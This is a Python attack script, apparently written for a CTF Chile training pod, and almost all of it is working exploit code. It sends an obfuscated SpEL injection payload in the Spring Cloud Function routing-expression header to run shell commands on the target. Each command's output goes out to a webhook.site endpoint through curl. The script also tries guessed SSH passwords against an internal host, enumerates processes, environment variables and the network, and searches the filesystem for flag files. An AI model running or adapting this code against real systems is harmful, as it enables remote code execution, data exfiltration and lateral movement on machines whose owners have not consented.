#!/usr/bin/env python3
"""
CTF Chile - Acceso SSH usando credenciales vault encontradas
"""
import requests
import time
import base64

TARGET = "http://training-pod2.ctfchile.com:32778"
ROUTER = TARGET + "/functionRouter"

# Crear webhook
print("[*] Usando credenciales vault para acceso SSH...")
UUID = requests.post("https://webhook.site/token", timeout=10).json()["uuid"]
WH = "https://webhook.site/" + UUID
print(f"    Webhook: https://webhook.site/#!/{UUID}")

def probe(tag, cmd):
    shell = f"{cmd} | base64 -w0 | xargs -I X curl -s '{WH}/{tag}?d=X'"
    p = f'T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("exe"+"c",new String[]{{}}.getClass()).invoke(T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("getRunt"+"ime").invoke(null),new String[]{{"/bin/sh","-c","{shell}"}}).waitFor()'
    try:
        r = requests.post(ROUTER, headers={
            "spring.cloud.function.routing-expression": p,
            "Content-Type": "text/plain",
        }, data="x", timeout=15)
        print(f"    [+] {tag:25} http {r.status_code}")
    except Exception as e:
        print(f"    [!] {tag} error: {e}")

print("[*] PROBANDO CREDENCIALES VAULT PARA SSH...")

# Probar las credenciales vault encontradas para SSH
vault_creds = [
    ("vault", "admin123"),
    ("admin", "admin123"),
    ("root", "admin123"),
    ("ubuntu", "admin123"),
    ("vault", "vault"),  # Por si acaso
]

for user, password in vault_creds:
    probe(f"ssh_vault_{user}", f"timeout 10 sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 {user}@10.160.209.1 'echo SSH_SUCCESS_{user} && whoami && hostname && pwd && ls -la' 2>/dev/null || echo 'SSH_FAILED_{user}:{password}'")

print("[*] BUSCANDO INFORMACIÓN ADICIONAL DEL VAULT...")

# Buscar más información sobre el sistema vault
probe("vault_process", "ps aux | grep -i vault")
probe("vault_files", "find / -name '*vault*' 2>/dev/null | head -10")
probe("vault_env", "env | grep -i vault")

print("[*] EXPLORANDO RED DESDE PERSPECTIVA VAULT...")

# Verificar conectividad de red más detallada
probe("network_detailed", "ip addr && echo '---' && ip route && echo '---' && arp -a")
probe("ping_internal", "ping -c 2 10.160.209.1 && echo 'PING_SUCCESS'")

print("[*] BUSCANDO FLAGS INCREMENTALES...")

# Buscar flags que podrían aparecer por acceso vault
probe("flag_vault_access", "find / -name '*flag*' 2>/dev/null | xargs cat 2>/dev/null | head -10")

time.sleep(15)

# Recoger respuestas
print("\n[*] Analizando resultados...")
r = requests.get(f"https://webhook.site/token/{UUID}/requests?sorting=newest&per_page=25", timeout=10)
data = r.json().get("data", [])

ssh_successes = []
flags_found = []
network_info = []

for req in data:
    url = req.get("url", "")
    path = url.split(f"webhook.site/{UUID}/")[-1].split("?")[0]
    q = req.get("query") or {}
    raw = q.get("d")
    if isinstance(raw, list):
        raw = raw[0] if raw else ""

    print("=" * 60)
    print(f"🔍 TAG: {path}")

    if raw:
        try:
            decoded = base64.b64decode(raw).decode("utf-8", "replace")
            print(decoded)

            # Detectar SSH exitoso
            if "SSH_SUCCESS" in decoded:
                ssh_successes.append((path, decoded))
                print(f"\n🎉🎉🎉 SSH EXITOSO EN {path}! 🎉🎉🎉")

            # Buscar flags
            if "ctfchile{" in decoded.lower():
                flags_found.append((path, decoded))
                print(f"\n🚩🚩🚩 FLAG ENCONTRADO EN {path}! 🚩🚩🚩")

            # Información de red útil
            if any(keyword in decoded.lower() for keyword in ["10.160", "10.109", "ssh", "connection"]):
                network_info.append((path, decoded))
                print("🔗 INFORMACIÓN DE RED")

        except Exception as e:
            print(f"(decode error) {raw[:100]}...")
    else:
        print("(sin payload)")

# Resumen final
print("\n" + "="*60)
print("📊 RESUMEN - ACCESO VAULT")
print("="*60)

if ssh_successes:
    print(f"🎉 SSH EXITOSO: {len(ssh_successes)} conexiones")
    for path, content in ssh_successes:
        print(f"    ✓ {path}")
        print(f"      {content[:100]}...")
    print("\n🚀 ¡PIVOTING COMPLETADO! Continuar exploración del host interno.")

elif flags_found:
    print(f"🚩 FLAGS ENCONTRADOS: {len(flags_found)}")
    for path, flag in flags_found:
        print(f"    {path}: {flag}")

else:
    print("💭 SSH aún no exitoso. Revisar información de red para siguiente paso.")

print(f"\n🔗 Webhook: https://webhook.site/#!/{UUID}")